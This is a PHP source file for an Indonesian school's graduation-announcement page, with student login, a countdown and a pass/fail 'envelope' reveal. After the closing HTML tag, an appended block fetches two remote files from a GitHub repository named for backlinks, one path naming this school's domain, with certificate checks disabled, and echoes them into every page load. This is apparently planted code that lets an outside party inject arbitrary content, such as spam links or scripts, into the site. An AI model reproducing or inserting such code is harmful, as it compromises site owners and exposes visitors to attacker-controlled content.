<?php
session_start();
require("config/database.php");
require("config/function.php");
require("config/functions.crud.php");
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<title>SKL &bull; <?= $setting['nama_sekolah'] ?></title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
	<link href="css/bootstrap.min.css" rel="stylesheet" />
	<link href="css/front.min.css" rel="stylesheet" />
    <link rel="icon" type="image/png" href="assets/front/images/favicon.ico" />
	<link rel="stylesheet" type="text/css" href="assets/front/vendor/animate/animate.css">
	<link rel="stylesheet" type="text/css" href="assets/front/vendor/select2/select2.min.css">
	<link rel="stylesheet" type="text/css" href="assets/front/vendor/countdowntime/flipclock.css">
	<link rel="stylesheet" href="assets/front/vendor/izitoast/css/iziToast.min.css">
	<link rel="stylesheet" type="text/css" href="assets/front/css/main.css">
	<link rel="stylesheet" type="text/css" href="assets/front/vendor/hover/css/hover.css">
	<link rel="stylesheet" type="text/css" href="assets/front/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
</head>
<style>
.blink {
  -webkit-animation: 2s linear infinite kedip; /* for Safari 4.0 - 8.0 */
  animation: 2s linear infinite kedip;
}
/* for Safari 4.0 - 8.0 */
@-webkit-keyframes kedip { 
  0% {
    visibility: hidden;
  }
  50% {
    visibility: hidden;
  }
  100% {
    visibility: visible;
  }
}
@keyframes kedip {
  0% {
    visibility: hidden;
  }
  50% {
    visibility: hidden;
  }
  100% {
    visibility: visible;
  }
}
</style>
<body>
<div class="flex-w flex-sb-m p-l-91 p-r-85 p-b-15 respon5">
	<div class="wrappic1 m-r-30 m-t-10 m-b-1">
		<a href="#"><img src="assets/front/images/Logo_SKL.png" alt="LOGO" width="260"></a>
	</div>
	<div class="flex-w m-t-1 m-b-1">
		<?php if (isset($_SESSION['id_siswaskl'])) { ?>
			<div class="animated flipInX hvr-pulse">
				<a href="logout.php" style="font-size: 20px;color:white" class=" flex-c-m  trans-04 m-l-6 m-r-6">
				<img src="assets/back/img/admin-avatar.png" alt="LOGO" width="40">
				<span class="m-l-5">Keluar</span></a>
			</div>
			<?php } else { ?>
			<a href="./admin" class="size3 flex-c-m how-social trans-04 m-r-6">
			<i class="fa fa-user"></i></a>
		<?php } ?>
	</div>
</div>
<?php
$akhir  = new DateTime($setting['tgl_pengumuman']); //Waktu awal
$awal = new DateTime(); // Waktu sekarang atau akhir
$diff  = $awal->diff($akhir);
?>

<div class="home-banner-bg home-banner-bg-color"></div>
<div class="home-banner-bg home-banner-bg-img"></div>
<?php if (!isset($_SESSION['id_siswaskl'])) { ?>
<div class="flex-w flex-sa p-r-200 respon1">
	<div class="animated bounceInLeft p-t-1 p-b-5 respon3">
		<p class="l1-txt1 p-b-10 respon2">
			PENGUMUMAN KELULUSAN
		</p>
		<?php if ($akhir <= $awal) { ?>
			<h3 class="l1-txt2 p-b-45 respon2 respon4">Sudah Dibuka
			<?php } else { ?>
				<h3 class="l1-txt2 p-b-45 respon2 respon4">Dibuka Dalam</h3>
				<div class="cd100"></div>
			<?php } ?>
		</div>
		<?php if ($akhir <= $awal) { ?>
			<div class="animated bounceInRight bg0 wsize1 bor1 p-l-45 p-r-45 p-t-20 p-b-18 p-lr-15-sm">
				<div style="text-align: center">
					<h3 class="l1-txt3 p-b-2">Login Siswa</h3>
				</div>
				<form id="form-login" class="w-full validate-form">
					<div class="wrap-input100 validate-input m-b-23" data-validate = "Username is reauired">
						<span class="label-input100"></span>
						<input class="input100 placeholder0 s1-txt1" type="text" name="username" placeholder="No Peserta">
						<span class="focus-input100"></span>
					</div>
					<div class="wrap-input100 validate-input" data-validate="Password is required">
						<span class="label-input100"></span>
						<input class="input100 placeholder0 s1-txt1" type="text" name="password" placeholder="Password">
						<span class="focus-input100"></span>
					</div>
					<br><br>
					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="flex-c-m size2 s1-txt2 how-btn7 trans-04">
								Masuk
							</button>
						</div>
					</div>
					<center class="s1-txt3 txt-center p-l-15 p-r-15 p-t-15">
						<marquee align="left" direction="left" onmouseout="this.start()" onmouseover="this.stop()" scrollamount="3"><font size="2" color="#333"><b><span class=""style="color:#006316"><i class="fa fa-user-circle"></i></span> Admin by <span class=""style="color:#006316"> &bull; </span> TIM IT <?= $setting['nama_sekolah'] ?> <span class=""style="color:#006316"><i class="fa fa-user-circle"></i></span></b></font>
						</center>
					</form>
				</div>
			</div>
<?php } else { ?>
<?php if ($setting['jenjang'] == "MTS") { ?>
<div class="col-sm-4">
	<a href="#"><img src="assets/img/logo/wisuda.png" alt="LOGO" width="300"></a> 
	<?php } ?>
	<?php } ?>
</div>
		
<?php } else { ?>
<?php $siswa = fetch($koneksi, 'siswa', ['id' => $_SESSION['id_siswaskl']]) ?>
	<div class="flex-w flex-sa p-r-200 respon1">
	<div class="p-t-34 respon3">
		<span style="font-size:40px" class="hvr-grow animated bounceInLeft l1-txt2 p-b-15 respon2 respon4">Hai &bull; <?= $siswa['nama'] ?> &bull; </span>
		<?php if ($akhir <= $awal) { ?>
			<b><p id='pbuka' class="animated flipInX l1-txt1 p-b-10 respon2">
				Silahkan Buka Amplopnya &bull;&bull;&bull;
			</p></b>
			<b><p id="plulus" class="animated flipInX l1-txt1 p-b-10 respon2">
				<?php if ($siswa['keterangan'] == 1) {
					echo "KAMU LULUS ANAK KU";
				} elseif ($siswa['keterangan'] == 2) {
					echo "LULUS BERSYARAT HUBUNGI WALI KELAS";
				} else {
					echo "MAAF KAMU TIDAK LULUS";
				}
			?></b>
		</p>
		<p class="animated flipInX p-b-10 respon2">
			<span class="blink">
				<b><span class=""style="color:#4F0">&bull; Teruslah Belajar &bull; </span><span class=""style="color:#ffff01">&bull; Berkarya &bull; </span><span class=""style="color:#fff">&bull; dan &bull; </span><span class=""style="color:#F00">&bull; Jadilah Pribadi Penebar Manfaat &bull;</span></b>
			</span>
		</p>
		<button id="pengumuman" style="height:50px" class="hvr-grow flex-c-m s1-txt2 how-btn5 m-t-30 trans-04">Pengumuman</button>
	<?php } else { ?>
		<p id='pbuka' class="animated flipInX l1-txt1 p-b-10 respon2">
			Pengumuman Kelulusan Belum Dibuka.
		</p>
		<p class="animated flipInX p-b-10 respon2">
			<span class="blink">
				<b><span class=""style="color:#ffff01">&bull; Perhatikan Jadwal Pengumuman &bull; </span></b>
			</span>
		</p>
	<?php } ?>
	<?php if ($siswa['keterangan'] == 1) { ?>
		<!-- <a target="_blank" href="lihatnilai.php?id=<?= enkripsi($siswa['id']) ?>" id="print"><button style="height:50px" class="hvr-grow flex-c-m s1-txt2 how-btn6 m-t-30 trans-04">Lihat Nilai</button></a> -->
		<a target="_blank" href="admin/foto_siswa/<?= $siswa['nisn'] ?>.pdf" id="print"><button style="height:50px" class="hvr-grow flex-c-m s1-txt2 how-btn6 m-t-30 trans-04">Cetak SKL</button></a>
	<?php } ?>
</div>
<div id="formpengumuman" class="animated fadeInRight bg0 wsize1 bor1 p-l-45 p-r-45 p-t-20 p-b-18 p-lr-15-sm">
	<center><h3 class="l1-txt3 p-b-1"><u>INFORMASI</u></h3></center>
	<?php $query = mysqli_query($koneksi, "SELECT * FROM pengumuman");
	while ($pengumuman = mysqli_fetch_array($query)) { ?>
		<center><span class="s1-txt3 p-l-15 p-r-15 p-t-25">
			<?= $pengumuman['tgl'] ?>
		</span></center>
		<span class="s1-txt3 txt-center p-l-15 p-r-15 p-t-25">
			<?= $pengumuman['pengumuman'] ?>
		</span>
		<hr>
		<br>
	<?php } ?>
</div>
<div id="formamplop">
	<div class="animated tada  p-l-45 p-r-45 p-t-24 p-b-10 p-lr-15-sm">
		<div class="loader"><img src="assets/back/img/loading.gif"></div>
		<?php if ($akhir <= $awal) { ?>
			<a id="amploptutup" class="animated tada hvr-pulse" href="#">
				<img src="assets/back/img/amploptutup.png" alt="LOGO" style="width:100%;max-width:400px;" />
			</a>
			<a id="amplopbuka" class="animated tada p-b-10" href="#">
				<img src="assets/back/img/amplopbuka.png" alt="LOGO" style="width:100%;max-width:400px;" />
			</a>
		<?php } else { ?>
			<p style="color: white; font-size:20px; text-align:center; padding-bottom:1em"><b>Hitung Mundur Dalam :</b></p>
			<div class="cd100"></div>
		<?php } ?>
	</div>
	<b><span id="keterangan" class="keter  animated tada ">
		<?php if ($siswa['keterangan'] == 1) {
			echo "LULUS";
		} elseif ($siswa['keterangan'] == 2) {
			echo "PANGGILAN";
		} else {
			echo "TIDAK <br> LULUS";
		}
		?>
	</span></b>
</div>
</div>
<?php } ?>
</div>
<!--=================================================================================-->
<script src="assets/front/vendor/jquery/jquery-3.2.1.min.js"></script>
<script src="assets/front/vendor/bootstrap/js/popper.js"></script>
<script src="assets/front/vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="assets/front/vendor/select2/select2.min.js"></script>
<script src="assets/front/vendor/countdowntime/flipclock.min.js"></script>
<script src="assets/front/vendor/countdowntime/moment.min.js"></script>
<script src="assets/front/vendor/countdowntime/moment-timezone.min.js"></script>
<script src="assets/front/vendor/countdowntime/moment-timezone-with-data.min.js"></script>
<script src="assets/front/vendor/countdowntime/countdowntime.js"></script>
<script src="assets/front/vendor/izitoast/js/iziToast.min.js"></script>
<!--=================================================================================-->
<script>
	$('.cd100').countdown100({
		/*Set Endtime here*/
		/*Endtime must be > current time*/
		endtimeMonth: <?= $diff->m ?>,
		endtimeDate: <?= $diff->d ?>,
		endtimeHours: <?= $diff->h ?>,
		endtimeMinutes: <?= $diff->i ?>,
		endtimeSeconds: <?= $diff->s ?>,
		timeZone: ""
			// ex:  timeZone: "America/New_York"
			//go to " http://momentjs.com/timezone/ " to get timezone
		});
</script>
<!--=================================================================================-->
<script src="assets/front/js/main.js"></script>
<script>
	$('#form-login').submit(function(e) {
		e.preventDefault();
		$.ajax({
			type: 'POST',
			url: 'ceklogin.php?pg=login',
			data: $(this).serialize(),

			success: function(data) {
				var json = $.parseJSON(data);
				if (json.pesan == 'ok') {
					iziToast.success({
						title: 'Gagah Men !!!',
						message: 'Ngana So Berhasil Login',
						position: 'topRight'
					});
					setTimeout(function() {
						window.location.href = "user";
					}, 2000);

				} else {
					iziToast.error({
						title: 'Maaf !!!',
						message: json.pesan,
						position: 'topCenter'
					});
				}

			}
		});
		return false;
	});
	<?php if (isset($_SESSION['id_siswaskl'])) { ?>
		$("#amploptutup").click(function(e) {
			e.preventDefault();
			$(this).hide();
			$(".loader").show();
			var id = '<?= $_SESSION['id_siswaskl'] ?>';
			$.ajax({
				type: 'POST',
				url: 'ceklogin.php?pg=bukaamplop',
				data: 'id=' + id,
				success: function(data) {

					setTimeout(function() {
						$(".loader").hide();
						$('#amplopbuka').show();
						$("#keterangan").show();
						$("#print").show();
						$("#pbuka").hide();
						$("#plulus").show();
					}, 3000);
				}
			});
		});
		$(".loader").hide();
		$("#plulus").hide();
		$("#amplopbuka").hide();
		$("#keterangan").hide();
		$("#print").hide();
		$("#formpengumuman").hide();
		$("#pengumuman").click(function(e) {
			e.preventDefault();
			$("#formamplop").hide();
			$("#formpengumuman").show();
		});
	<?php } ?>
</script>
</body>
</html>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/mtsdarululumsasa/skl.mtsdarululumsasa.sch.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
